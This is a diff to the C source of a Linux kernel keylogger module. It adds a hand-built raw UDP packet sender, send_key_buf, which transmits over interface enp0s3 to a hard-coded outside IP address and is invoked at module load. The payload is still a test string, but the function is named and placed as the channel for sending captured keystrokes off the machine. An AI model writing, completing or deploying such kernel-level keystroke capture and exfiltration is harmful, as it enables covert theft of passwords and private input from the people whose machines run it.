@@ -5,12 +5,19 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-// for memset
+// for memset and memcpy
 #include <linux/string.h>
 
 // for keyboard and notification chain
 #include <linux/notifier.h>
 #include <linux/keyboard.h>
+
+// for network
+#include <linux/netdevice.h>
+#include <linux/udp.h>
+#include <linux/ip.h>
+#include <linux/if_ether.h>
+#include <linux/netpoll.h>
 
 #define DEBUG 0
 #define debug(args...) if(DEBUG) printk(KERN_INFO args)
@@ -65,52 +72,96 @@ void print_key(void) {
         printk(KERN_INFO ".(0x%x)\n", c);
 }
 
-/* send key_buf over the network */
+#define IP_HEADER_RM 20
+#define UDP_HEADER_RM 8
+
+/* translate string to unsigned int for ip address */
+static unsigned int inet_addr(char *ip) {
+    int a, b, c, d;
+    char res[4];
+    sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);
+    res[0] = (char)a;
+    res[1] = (char)b;
+    res[2] = (char)c;
+    res[3] = (char)d;
+    return *((unsigned int*)res);
+}
+
+/* send key_buf over the network 
+ * return 0 for success and 1 for failure */
 static int send_key_buf(void){
-    unsigned char *Data = "Test_Packet";
-    int i = strlen(Data);
-    struct sk_buff* skb = alloc_skb(ETH_HLEN + IP_Header_RM + UDP_Header_RM + i, GFP_ATOMIC);
-    struct net_device *Device;
-    uint16_t proto;
+    
+    static char addr[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
+    uint8_t dest_addr[ETH_ALEN];
+
+    unsigned char* data;
+    char *srcIP = "10.0.2.15";
+    char *dstIP = "123.123.123.123";
+    char *hello_world = ">>> KERNEL sk_buff Hello World <<< by Dmytro Shytyi";
+    int udp_payload_len = 51;
+    int udp_total_len = UDP_HEADER_RM + udp_payload_len;
+    int ip_total_len = IP_HEADER_RM + udp_total_len;
+    
+    struct sk_buff* skb;
+
+    struct net_device *enp0s3;
+
+    struct udphdr* uh;
     struct iphdr* iph;
     struct ethhdr* eth;
-    struct udphdr* uh;
-    uint8_t Mac_Addr[ETH_ALEN] = {0x38, 0xd5, 0x47, 0xa1, 0x07, 0x41};
 
-    skb_reserve(skb, ETH_HLEN + IP_Header_RM + UDP_Header_RM + i);
-    Data = skb_put(skb, i);
-    iph = (struct iphdr*)skb_push(skb, IP_Header_RM);
-    uh = (struct udphdr*)skb_push(skb, UDP_Header_RM);
-    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
+    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
 
-    Device = dev_get_by_name(&init_net,"enp0s3");
-    if (Device == NULL) {
-        printk(KERN_INFO "init_Module: no such device enp0s3\n");
+    if (enp0s3 == NULL) {
+        printk(KERN_ALERT "network device not found!\n");
         return 1;
     }
-    proto = ETH_P_IP;
-    uh->len = htons(i); 
-    uh->source = htons(2121);
-    uh->dest = htons(2121);
 
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len= htons(IP_Header_RM + i); 
-    iph->frag_off = 0; 
-    iph->ttl = 64;
-    iph->protocol = IPPROTO_UDP;
-    iph->check = 0; 
-    iph->saddr = 19216805;
-    iph->daddr = 19216804;
-    skb->protocol = eth->h_proto = htons(proto);
-    skb->no_fcs = 1;
-    memcpy(eth->h_source, Device->dev_addr, ETH_ALEN);
-    memcpy(eth->h_dest, Mac_Addr, ETH_ALEN);
-
-
+    memcpy(dest_addr, addr, ETH_ALEN);
+    
+    //allocate a network buffer
+    skb = alloc_skb(ETH_HLEN + ip_total_len, GFP_ATOMIC);
+    skb->dev = enp0s3;
     skb->pkt_type = PACKET_OUTGOING;
-    dev_queue_xmit(skb);
+    //adjust headroom
+    skb_reserve(skb, ETH_HLEN + IP_HEADER_RM + UDP_HEADER_RM);
+
+    data = skb_put(skb, udp_payload_len);
+    memcpy(data, hello_world, udp_payload_len);
+
+    // udp header
+    uh = (struct udphdr*)skb_push(skb, UDP_HEADER_RM);
+    uh->len = htons(udp_total_len);
+    uh->source = htons(15934); // upd ports
+    uh->dest = htons(15904);
+
+    // ip header
+    iph = (struct iphdr*)skb_push(skb, IP_HEADER_RM);
+    iph->ihl = IP_HEADER_RM / 4;//4*5=20 ip_header_len
+    iph->version = 4; // IPv4u
+    iph->tos = 0;
+    iph->tot_len = htons(ip_total_len);
+    iph->frag_off = 0;
+    iph->ttl = 64; // Set a TTL.
+    iph->protocol = IPPROTO_UDP; //  protocol.
+    iph->check = 0;
+    iph->saddr = inet_addr(srcIP);
+    iph->daddr = inet_addr(dstIP);
+
+    /* changing Mac address */   
+    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));//add data to the start of a buffer
+    skb->protocol = eth->h_proto = htons(ETH_P_IP);
+    skb->no_fcs = 1;
+    memcpy(eth->h_source, enp0s3->dev_addr, ETH_ALEN);
+    memcpy(eth->h_dest, dest_addr, ETH_ALEN); /* set packet type and send the packet. */
+    skb->pkt_type = PACKET_OUTGOING;
+    
+    // put the buffer into the sending queue of the device
+    if(dev_queue_xmit(skb) < 0) {
+        printk(KERN_ALERT "failing to send!\n");
+        return 1;
+    }
+
     return 0;
 }
 
@@ -156,6 +207,7 @@ static int keylogger_init(void)
     memset(key_buf, 0, BUF_SIZE);
     key_buf_ptr = 0;
     register_keyboard_notifier(&nb);
+    send_key_buf();// for testing
     return 0;
 }
 
